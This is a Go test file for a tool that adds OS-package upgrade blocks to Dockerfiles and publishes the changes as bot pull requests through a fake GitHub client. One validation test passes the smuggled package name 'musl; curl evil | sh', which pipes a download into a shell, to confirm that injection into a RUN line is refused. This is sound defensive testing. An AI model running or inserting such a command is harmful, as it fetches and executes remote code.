package imagescan

import (
	"context"
	"errors"
	"fmt"
	"maps"
	"net/http"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/compliance-framework/workflows/internal/bump"
)

// TestPatchDockerfile checks the managed block against testdata/patch/<case>.Dockerfile.golden:
// inserted right after the FROM of the final image's base stage (followed back through FROM
// <stage>, after a FROM's continuation lines, before the stage's USER), regenerated in place of an
// existing block, and removed when there is nothing to upgrade.
func TestPatchDockerfile(t *testing.T) {
	for _, tc := range []struct {
		name, pm string
		pkgs     []string
	}{
		{"alpine", APK, []string{"brotli-libs", "curl", "libcurl"}},
		{"debian", APT, []string{"libbrotli1", "libc6"}},
		{"multistage", APK, []string{"musl"}},
		{"existing", APK, []string{"brotli-libs", "curl"}},
		{"removal", "", nil},
	} {
		t.Run(tc.name, func(t *testing.T) {
			path := filepath.Join("testdata", "patch", tc.name+".Dockerfile")
			src, err := os.ReadFile(path)
			if err != nil {
				t.Fatal(err)
			}
			got, err := PatchDockerfile(src, tc.pm, tc.pkgs)
			if err != nil {
				t.Fatal(err)
			}
			goldenFile(t, path+".golden", got)
			// Applying it again changes nothing, and the result still parses to the same stages.
			again, err := PatchDockerfile(got, tc.pm, tc.pkgs)
			if err != nil || string(again) != string(got) {
				t.Errorf("not idempotent (%v):\n%s", err, again)
			}
			before, _ := ParseDockerfile(src)
			after, err := ParseDockerfile(got)
			if err != nil || len(after.Stages) != len(before.Stages) {
				t.Errorf("stages changed: %v", err)
			}
		})
	}
}

func TestPatchDockerfileErrors(t *testing.T) {
	for _, tc := range []struct {
		src, pm string
		pkgs    []string
		err     string
	}{
		{"FROM alpine\n" + BlockBegin + "\nRUN x\n", APK, nil, "without"},
		{"FROM alpine\n" + BlockEnd + "\n", APK, nil, "unbalanced"},
		{"FROM alpine\n" + BlockBegin + "\n" + BlockBegin + "\n" + BlockEnd + "\n", APK, nil, "unbalanced"},
		{"FROM golang AS b\nFROM scratch\n", APK, []string{"musl"}, "scratch"},
		{"FROM alpine\n", "", []string{"musl"}, "no package manager"},
		// A name goes into a RUN line: anything that isn't a package name is refused.
		{"FROM alpine\n", APK, []string{"musl; curl evil | sh"}, "not an OS package name"},
		{"FROM alpine\n", APK, []string{"-f"}, "not an OS package name"},
	} {
		if _, err := PatchDockerfile([]byte(tc.src), tc.pm, tc.pkgs); err == nil || !strings.Contains(err.Error(), tc.err) {
			t.Errorf("%q %v: err = %v, want one containing %q", tc.src, tc.pkgs, err, tc.err)
		}
	}
}

func goldenFile(t *testing.T, path string, got []byte) {
	t.Helper()
	if *update {
		if err := os.WriteFile(path, got, 0o644); err != nil {
			t.Fatal(err)
		}
		return
	}
	want, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("%v (run go test -update to create it)", err)
	}
	if string(got) != string(want) {
		t.Errorf("%s differs (go test -update rewrites it):\n%s", path, got)
	}
}

func TestOSPatches(t *testing.T) {
	brotli := Finding{Package: "brotli-libs", Type: TypeOS, Installed: "1.2.0-r1", Fixed: []string{"1.2.1-r0"}, IDs: []string{"CVE-2026-111497"}, Score: 9.2}
	low := Finding{Package: "zlib", Type: TypeOS, Installed: "1", Fixed: []string{"2"}, IDs: []string{"CVE-1"}, Score: 5}
	node := Finding{Package: "node", Type: TypeBinary, Installed: "20.20.2", Fixed: []string{"22.23.4"}, IDs: []string{"CVE-2026-111497"}, Score: 9.2}
	nginx := Ref{Name: "nginx", Tag: "stable-alpine"}
	pinned := Ref{Name: "nginx", Tag: "stable-alpine", Digest: oldDigest}
	block := "FROM nginx:stable-alpine\n" + BlockBegin + "\n" + blockNote + "\nRUN apk upgrade --no-cache brotli-libs\n" + BlockEnd + "\n"
	final := func(path string, ref Ref, pm string, fs ...Finding) Target {
		return Target{Dockerfile: path, Base: Base{Ref: ref, Role: RoleFinal}, Scan: &Scan{Findings: fs, PackageManager: pm}}
	}
	for _, tc := range []struct {
		name    string
		files   map[string]string
		targets []Target
		fixed   map[string]bool
		want    []string // "<file> <packages>" ("-" for a removal)
		notes   []string
	}{
		{
			name:    "actionable OS findings only; not the runtime or a MEDIUM one",
			files:   map[string]string{"Dockerfile": "FROM nginx:stable-alpine\n"},
			targets: []Target{final("Dockerfile", nginx, APK, brotli, low, node)},
			want:    []string{"Dockerfile brotli-libs"},
		},
		{
			name:    "rule 1 fixes it: no patch, and an existing block stays until the update merges",
			files:   map[string]string{"Dockerfile": block},
			targets: []Target{final("Dockerfile", pinned, APK, brotli)},
			fixed:   map[string]bool{pinned.String(): true},
		},
		{
			name:    "the base image ships the fixes: the block goes",
			files:   map[string]string{"Dockerfile": block},
			targets: []Target{final("Dockerfile", nginx, APK, low)},
			want:    []string{"Dockerfile -"},
			notes:   []string{"ships the fixes now"},
		},
		{
			name:    "already patched: no change",
			files:   map[string]string{"Dockerfile": block},
			targets: []Target{final("Dockerfile", nginx, APK, brotli)},
		},
		{
			name:    "distroless: logged and skipped",
			files:   map[string]string{"Dockerfile": "FROM gcr.io/distroless/base-debian12\n"},
			targets: []Target{final("Dockerfile", Ref{Name: "gcr.io/distroless/base-debian12"}, "", brotli)},
			notes:   []string{"no apk or apt-get"},
		},
		{
			name:    "a base image that couldn't be scanned leaves its Dockerfile alone",
			files:   map[string]string{"Dockerfile": block, "Dockerfile-ci": "FROM nginx:stable-alpine\n"},
			targets: []Target{{Dockerfile: "Dockerfile", Base: Base{Ref: nginx, Role: RoleFinal}}, final("Dockerfile-ci", nginx, APK, brotli)},
			want:    []string{"Dockerfile-ci brotli-libs"},
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			files := map[string][]byte{}
			for k, v := range tc.files {
				files[k] = []byte(v)
			}
			var notes []string
			patches := osPatches(files, tc.targets, tc.fixed, func(f string, a ...any) { notes = append(notes, fmt.Sprintf(f, a...)) })
			var got []string
			for _, p := range patches {
				pk := strings.Join(p.Packages, " ")
				if p.Removes() {
					pk = "-"
				}
				got = append(got, p.Dockerfile+" "+pk)
			}
			if !slices.Equal(got, tc.want) {
				t.Errorf("patches %q, want %q", got, tc.want)
			}
			for _, want := range tc.notes {
				if !slices.ContainsFunc(notes, func(n string) bool { return strings.Contains(n, want) }) {
					t.Errorf("no note containing %q in %q", want, notes)
				}
			}
		})
	}
}

// fakeGH is one repo's branches, PR and commits for Publisher; it records every write.
type fakeGH struct {
	branches map[string]string   // branch -> head commit
	commits  map[string][]string // commit -> tree, parents...
	pr       *bump.PR
	authors  []string          // the PR's commits
	branch   []string          // PatchBranch's commits that aren't on main
	files    map[string]string // "sha:path" -> content; anything else is a 404
	writes   []string
}

func (f *fakeGH) DefaultBranch(context.Context, string) (string, error) { return "main", nil }
func (f *fakeGH) BranchHead(_ context.Context, _, b string) (string, error) {
	return f.branches[b], nil
}
func (f *fakeGH) BranchAuthors(_ context.Context, _, base, head string) ([]string, error) {
	if base != "main" || head != f.branches[PatchBranch] {
		return nil, fmt.Errorf("compare %s...%s", base, head)
	}
	return f.branch, nil
}
func (f *fakeGH) File(_ context.Context, _, ref, path string) ([]byte, error) {
	c, ok := f.files[ref+":"+path]
	if !ok {
		return nil, &bump.StatusError{Code: http.StatusNotFound}
	}
	return []byte(c), nil
}
func (f *fakeGH) CommitTree(_ context.Context, _, sha string) (string, []string, error) {
	c, ok := f.commits[sha]
	if !ok {
		return "", nil, errors.New("no commit " + sha)
	}
	return c[0], c[1:], nil
}
func (f *fakeGH) CreateTree(_ context.Context, _, base string, files map[string][]byte) (string, error) {
	var parts []string
	for _, p := range slices.Sorted(maps.Keys(files)) {
		parts = append(parts, p+"="+fmt.Sprint(len(files[p])))
	}
	return base + "+" + strings.Join(parts, ","), nil // the same content, the same tree
}
func (f *fakeGH) CreateCommit(_ context.Context, _, msg, tree, parent string, a bump.Identity) (string, error) {
	f.writes = append(f.writes, fmt.Sprintf("commit %s on %s by %s: %s", tree, parent, a.Name, strings.SplitN(msg, "\n", 2)[0]))
	return "new", nil
}
func (f *fakeGH) SetBranch(_ context.Context, _, b, sha string, create bool) error {
	f.writes = append(f.writes, fmt.Sprintf("set %s=%s create=%v", b, sha, create))
	return nil
}
func (f *fakeGH) OpenPR(context.Context, string, string) (*bump.PR, error) { return f.pr, nil }
func (f *fakeGH) PRCommitAuthors(context.Context, string, int) ([]string, error) {
	return f.authors, nil
}
func (f *fakeGH) CreatePR(_ context.Context, _, base, head, title, _ string) (*bump.PR, error) {
	f.writes = append(f.writes, fmt.Sprintf("open %s<-%s %q", base, head, title))
	return &bump.PR{Number: 9}, nil
}
func (f *fakeGH) UpdatePR(_ context.Context, _ string, n int, title, _ string) error {
	f.writes = append(f.writes, fmt.Sprintf("update #%d %q", n, title))
	return nil
}
func (f *fakeGH) AddLabel(_ context.Context, _ string, n int, l bump.Label) error {
	f.writes = append(f.writes, fmt.Sprintf("label #%d %s", n, l.Name))
	return nil
}
func (f *fakeGH) ClosePR(_ context.Context, _ string, n int, _ string) error {
	f.writes = append(f.writes, fmt.Sprintf("close #%d", n))
	return nil
}
func (f *fakeGH) DeleteBranch(_ context.Context, _, b string) error {
	f.writes = append(f.writes, "delete "+b)
	return nil
}

func TestPublish(t *testing.T) {
	const bot = "ccf-release-bot[bot]"
	brotli := Finding{Package: "brotli-libs", Type: TypeOS, Installed: "1.2.0-r1", Fixed: []string{"1.2.1-r0"}, IDs: []string{"ALPINE-CVE-2026-111497"}, Aliases: []string{"CVE-2026-111497"}, Score: 9.2}
	patch := FilePatch{Dockerfile: "Dockerfile", Image: "nginx:stable-alpine", Findings: []Finding{brotli}, Packages: []string{"brotli-libs"}, Old: []byte("FROM nginx\n"), New: []byte("FROM nginx\nRUN x\n")}
	removal := FilePatch{Dockerfile: "Dockerfile", Image: "nginx:stable-alpine", Old: []byte("FROM nginx\nRUN x\n"), New: []byte("FROM nginx\n")}
	botPR := func(title string, labels ...string) *bump.PR {
		pr := &bump.PR{Number: 4, Title: title}
		pr.User.Login = bot
		for _, l := range labels {
			pr.Labels = append(pr.Labels, bump.PRLabel{Name: l})
		}
		return pr
	}
	const title = "fix(deps): patch OS packages in nginx:stable-alpine (CVE-2026-111497)"
	tree := "t0+Dockerfile=17"
	// at is the Dockerfile at commit sha, as the scan read it.
	at := func(sha string, p FilePatch) map[string]string {
		return map[string]string{sha + ":Dockerfile": string(p.Old)}
	}
	for _, tc := range []struct {
		name    string
		gh      *fakeGH
		patches []FilePatch
		dryRun  bool
		want    []string
		log     string
	}{
		{
			name:    "first run: branch, commit by the bot, PR, label",
			gh:      &fakeGH{branches: map[string]string{"main": "h1"}, commits: map[string][]string{"h1": {"t0"}}, files: at("h1", patch)},
			patches: []FilePatch{patch},
			want: []string{
				"commit " + tree + " on h1 by " + bot + ": " + title,
				"set image-scan/os-patches=new create=true",
				`open main<-image-scan/os-patches "` + title + `"`,
				"label #9 renovate:automerge",
			},
		},
		{
			name: "unchanged, on the current head: no push, no update",
			gh: &fakeGH{branches: map[string]string{"main": "h1", PatchBranch: "p1"}, commits: map[string][]string{"h1": {"t0"}, "p1": {tree, "h1"}},
				pr: botPR(title, "renovate:automerge"), authors: []string{bot}, branch: []string{bot}, files: at("h1", patch)},
			patches: []FilePatch{patch},
		},
		{
			name: "main moved: rebuilt on the new head (force) and the PR updated",
			gh: &fakeGH{branches: map[string]string{"main": "h2", PatchBranch: "p1"}, commits: map[string][]string{"h2": {"t0"}, "p1": {tree, "h1"}},
				pr: botPR(title, "renovate:automerge"), authors: []string{bot}, branch: []string{bot}, files: at("h2", patch)},
			patches: []FilePatch{patch},
			want: []string{
				"commit " + tree + " on h2 by " + bot + ": " + title,
				"set image-scan/os-patches=new create=false",
				`update #4 "` + title + `"`,
			},
		},
		{
			name: "a person took the label off: the update keeps it off",
			gh: &fakeGH{branches: map[string]string{"main": "h2", PatchBranch: "p1"}, commits: map[string][]string{"h2": {"t0"}, "p1": {tree, "h1"}},
				pr: botPR(title), authors: []string{bot}, branch: []string{bot}, files: at("h2", patch)},
			patches: []FilePatch{patch},
			want: []string{
				"commit " + tree + " on h2 by " + bot + ": " + title,
				"set image-scan/os-patches=new create=false",
				`update #4 "` + title + `"`,
			},
		},
		{
			name:    "someone pushed to it: left alone",
			gh:      &fakeGH{branches: map[string]string{"main": "h1", PatchBranch: "p1"}, pr: botPR(title), authors: []string{bot, "octocat"}},
			patches: []FilePatch{patch},
			log:     "left alone",
		},
		{
			name:    "no PR, but someone pushed to the branch: left alone",
			gh:      &fakeGH{branches: map[string]string{"main": "h1", PatchBranch: "p1"}, commits: map[string][]string{"h1": {"t0"}}, branch: []string{bot, "octocat"}, files: at("h1", patch)},
			patches: []FilePatch{patch},
			log:     "image-scan/os-patches has a commit by octocat, not ccf-release-bot[bot]; left alone",
		},
		{
			name:    "no PR, a commit GitHub can't link to an account on the branch: left alone",
			gh:      &fakeGH{branches: map[string]string{"main": "h1", PatchBranch: "p1"}, commits: map[string][]string{"h1": {"t0"}}, branch: []string{""}, files: at("h1", patch)},
			patches: []FilePatch{patch},
			log:     "a commit by an unknown author",
		},
		{
			name: "nothing to patch, the PR's branch has someone else's commit: not closed",
			gh:   &fakeGH{branches: map[string]string{"main": "h1", PatchBranch: "p1"}, pr: botPR(title), authors: []string{bot}, branch: []string{"octocat"}},
			log:  "left alone",
		},
		{
			name: "no PR, only the bot's commits on the branch: rebuilt and a PR opened",
			gh: &fakeGH{branches: map[string]string{"main": "h2", PatchBranch: "p1"}, commits: map[string][]string{"h2": {"t0"}, "p1": {tree, "h1"}},
				branch: []string{bot}, files: at("h2", patch)},
			patches: []FilePatch{patch},
			want: []string{
				"commit " + tree + " on h2 by " + bot + ": " + title,
				"set image-scan/os-patches=new create=false",
				`open main<-image-scan/os-patches "` + title + `"`,
				"label #9 renovate:automerge",
			},
		},
		{
			name: "the Dockerfile changed on main since the scan: nothing written",
			gh: &fakeGH{branches: map[string]string{"main": "h2", PatchBranch: "p1"}, commits: map[string][]string{"h2": {"t0"}, "p1": {tree, "h1"}},
				pr: botPR(title, "renovate:automerge"), authors: []string{bot}, branch: []string{bot},
				files: map[string]string{"h1:Dockerfile": string(patch.Old), "h2:Dockerfile": "FROM nginx:mainline\n"}},
			patches: []FilePatch{patch},
			log:     "Dockerfile changed on main since the scan (now h2); left for the next run",
		},
		{
			name:    "the Dockerfile was deleted on main since the scan: nothing written",
			gh:      &fakeGH{branches: map[string]string{"main": "h1"}, commits: map[string][]string{"h1": {"t0"}}},
			patches: []FilePatch{patch},
			log:     "changed on main since the scan",
		},
		{
			name:    "a PR from the branch opened by someone else: left alone",
			gh:      &fakeGH{branches: map[string]string{"main": "h1"}, pr: &bump.PR{Number: 4}, authors: []string{bot}},
			patches: []FilePatch{patch},
			log:     "left alone",
		},
		{
			name:    "only removing the block: a chore PR",
			gh:      &fakeGH{branches: map[string]string{"main": "h1"}, commits: map[string][]string{"h1": {"t0"}}, files: at("h1", removal)},
			patches: []FilePatch{removal},
			want: []string{
				"commit t0+Dockerfile=11 on h1 by " + bot + ": chore(deps): remove the OS package patches of nginx:stable-alpine",
				"set image-scan/os-patches=new create=true",
				`open main<-image-scan/os-patches "chore(deps): remove the OS package patches of nginx:stable-alpine"`,
				"label #9 renovate:automerge",
			},
		},
		{
			name: "nothing to patch any more: the PR is closed and the branch deleted",
			gh:   &fakeGH{branches: map[string]string{"main": "h1", PatchBranch: "p1"}, pr: botPR(title), authors: []string{bot}, branch: []string{bot}},
			want: []string{"close #4", "delete image-scan/os-patches"},
		},
		{
			name: "nothing to patch and no PR: nothing",
			gh:   &fakeGH{branches: map[string]string{"main": "h1"}},
		},
		{
			name:    "dry run: logs, writes nothing",
			gh:      &fakeGH{branches: map[string]string{"main": "h1"}, commits: map[string][]string{"h1": {"t0"}}},
			patches: []FilePatch{patch},
			dryRun:  true,
			log:     "dry run: would push image-scan/os-patches and open or update \"" + title + "\"",
		},
		{
			name:   "dry run of a close",
			gh:     &fakeGH{branches: map[string]string{"main": "h1"}, pr: botPR(title), authors: []string{bot}},
			dryRun: true,
			log:    "dry run: would close it",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			var out strings.Builder
			p := &Publisher{GH: tc.gh, Author: bot, Identity: bump.Identity{Name: bot, Email: "1+" + bot + "@users.noreply.github.com"}, DryRun: tc.dryRun, Out: &out}
			if err := p.Publish(context.Background(), "ui", tc.patches); err != nil {
				t.Fatal(err)
			}
			if !slices.Equal(tc.gh.writes, tc.want) {
				t.Errorf("writes:\n%s\nwant:\n%s", strings.Join(tc.gh.writes, "\n"), strings.Join(tc.want, "\n"))
			}
			if !strings.Contains(out.String(), tc.log) {
				t.Errorf("log has no %q:\n%s", tc.log, out.String())
			}
		})
	}
}

func TestPatchPRText(t *testing.T) {
	f := func(pkg, id string) Finding {
		return Finding{Package: pkg, Type: TypeOS, Installed: "1", Fixed: []string{"2"}, IDs: []string{id}, Score: 9}
	}
	patches := []FilePatch{
		{Dockerfile: "Dockerfile", Image: "debian:bookworm-slim", Packages: []string{"a", "b"}, Findings: []Finding{f("a", "CVE-1"), f("b", "CVE-2"), f("a", "CVE-3")}},
		{Dockerfile: "Dockerfile-ci", Image: "alpine:3.24", Packages: []string{"c"}, Findings: []Finding{f("c", "CVE-4"), f("c", "CVE-5")}},
		{Dockerfile: "Dockerfile-old", Image: "alpine:3.23"},
	}
	title, body := patchPRText(patches)
	if title != "fix(deps): patch OS packages in alpine:3.24, debian:bookworm-slim (CVE-1, CVE-2, CVE-3, CVE-4, and 1 more)" {
		t.Errorf("title = %q", title)
	}
	for _, want := range []string{"| `Dockerfile` | `debian:bookworm-slim` | a | 1 | 2 | CRITICAL | CVE-1 |", "`Dockerfile-old`: `alpine:3.23` ships the fixes now", "needs-human"} {
		if !strings.Contains(body, want) {
			t.Errorf("body has no %q:\n%s", want, body)
		}
	}
}
